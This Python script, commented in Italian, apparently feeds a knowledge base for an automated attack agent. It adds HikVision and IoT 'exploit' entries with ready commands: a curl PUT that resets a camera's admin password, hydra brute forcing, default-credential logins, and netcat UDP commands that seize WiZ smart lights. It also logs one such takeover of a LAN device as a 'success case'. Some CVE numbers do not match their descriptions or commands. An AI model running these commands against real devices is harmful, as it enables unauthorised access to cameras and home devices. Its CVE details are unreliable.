#!/usr/bin/env python3
"""
Script per migliorare automaticamente la knowledge base.
Aggiunge:
1. Manuali tool comuni
2. Exploit database HikVision/IoT
3. Success cases dalla storia
"""

import sys
import os
# Aggiungi parent directory al path per import
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(__file__))))

from knowledge.knowledge_enhancer import knowledge_enhancer
import logging

logging.basicConfig(level=logging.INFO)


def add_hikvision_exploits():
    """Aggiunge exploit noti per HikVision."""
    print("📦 Aggiunta exploit HikVision...")
    
    exploits = [
        {
            'title': 'HikVision Authentication Bypass CVE-2021-36260',
            'cve': 'CVE-2021-36260',
            'description': 'Authentication bypass in HikVision cameras via crafted requests',
            'commands': [
                'curl -i http://<IP>/SDK/webLanguage',
                'curl -i -X PUT http://<IP>/Security/users/1 -d "<User><id>1</id><userName>admin</userName><password>newpass</password></User>"'
            ],
            'target': 'HikVision IP Cameras',
            'difficulty': 'medium'
        },
        {
            'title': 'HikVision Unauthenticated Command Injection',
            'cve': 'CVE-2017-7921',
            'description': 'Unauthenticated remote command injection via RTSP',
            'commands': [
                'nmap -p 554,8000 --script rtsp-url-brute <IP>',
                'ffmpeg -rtsp_transport tcp -i "rtsp://<IP>:554/Streaming/Channels/101" -frames:v 1 out.jpg'
            ],
            'target': 'HikVision Cameras (old firmware)',
            'difficulty': 'medium'
        }
    ]
    
    for exploit in exploits:
        knowledge_enhancer.add_exploit_knowledge(exploit)
    
    print(f"  ✅ Aggiunti {len(exploits)} exploit HikVision")


def add_iot_exploits():
    """Aggiunge exploit per dispositivi IoT comuni."""
    print("📦 Aggiunta exploit IoT...")
    
    exploits = [
        {
            'title': 'WiZ Smart Light UDP Control',
            'cve': 'N/A',
            'description': 'WiZ smart lights use unauthenticated UDP protocol on port 38899',
            'commands': [
                'nmap -p 38899 -sU <IP>',
                'echo \'{"method":"getPilot","params":{}}\' | nc -u <IP> 38899 -w 1',
                'echo \'{"method":"setPilot","params":{"state":true}}\' | nc -u <IP> 38899 -w 1',
                'echo \'{"method":"setPilot","params":{"r":255,"g":0,"b":0}}\' | nc -u <IP> 38899 -w 1'
            ],
            'target': 'WiZ Smart Lights',
            'difficulty': 'easy'
        },
        {
            'title': 'Generic IoT Default Credentials',
            'cve': 'N/A',
            'description': 'Common default credentials for IoT devices',
            'commands': [
                'hydra -L users.txt -P passwords.txt <IP> http-get /',
                'curl -u admin:admin http://<IP>/',
                'curl -u admin:12345 http://<IP>/',
                'curl -u root:root http://<IP>/'
            ],
            'target': 'Generic IoT devices',
            'difficulty': 'easy'
        }
    ]
    
    for exploit in exploits:
        knowledge_enhancer.add_exploit_knowledge(exploit)
    
    print(f"  ✅ Aggiunti {len(exploits)} exploit IoT")


def add_wiz_success():
    """Aggiunge il successo WiZ alla knowledge base."""
    print("🎉 Aggiunta success case WiZ...")
    
    knowledge_enhancer.learn_from_success(
        attack_type='IoT Smart Light Control',
        target='WiZ Smart Light (192.168.1.14)',
        commands=[
            'nmap -sU -p 38899 192.168.1.14',
            'echo \'{"method":"setPilot","params":{"state":true}}\' | nc -u 192.168.1.14 38899 -w 1',
            'echo \'{"method":"setPilot","params":{"state":false}}\' | nc -u 192.168.1.14 38899 -w 1',
            'echo \'{"method":"setPilot","params":{"r":255,"g":0,"b":0}}\' | nc -u 192.168.1.14 38899 -w 1'
        ],
        result='{"method":"setPilot","env":"pro","result":{"success":true}}'
    )
    
    print("  ✅ Success case salvato")


def index_common_tools():
    """Indicizza manuali tool comuni."""
    print("📚 Indicizzazione manuali tool...")
    
    tools = ['nmap', 'curl', 'netcat', 'hydra', 'sqlmap', 'nikto', 'dirb']
    
    indexed = 0
    for tool in tools:
        if knowledge_enhancer.index_tool_manual(tool):
            indexed += 1
    
    print(f"  ✅ Indicizzati {indexed}/{len(tools)} manuali")


def main():
    print("=" * 60)
    print("MIGLIORAMENTO KNOWLEDGE BASE")
    print("=" * 60)
    print()
    
    # Stats iniziali
    stats_before = knowledge_enhancer.get_stats()
    print("📊 Stato iniziale:")
    for key, value in stats_before.items():
        print(f"  {key}: {value}")
    print()
    
    # Aggiungi conoscenza
    add_hikvision_exploits()
    add_iot_exploits()
    add_wiz_success()
    index_common_tools()
    
    # Stats finali
    print()
    stats_after = knowledge_enhancer.get_stats()
    print("📊 Stato finale:")
    for key, value in stats_after.items():
        delta = value - stats_before.get(key, 0)
        print(f"  {key}: {value} (+{delta})")
    
    print()
    print("=" * 60)
    print("✅ Knowledge base migliorata!")
    print("=" * 60)
    
    # Test search
    print("\n🔍 Test enhanced search:")
    results = knowledge_enhancer.enhanced_search("HikVision camera exploit", top_k=3)
    for i, res in enumerate(results, 1):
        print(f"\n{i}. [{res['source']}] (distance: {res['distance']:.3f})")
        print(f"   {res['doc'][:150]}...")


if __name__ == "__main__":
    main()

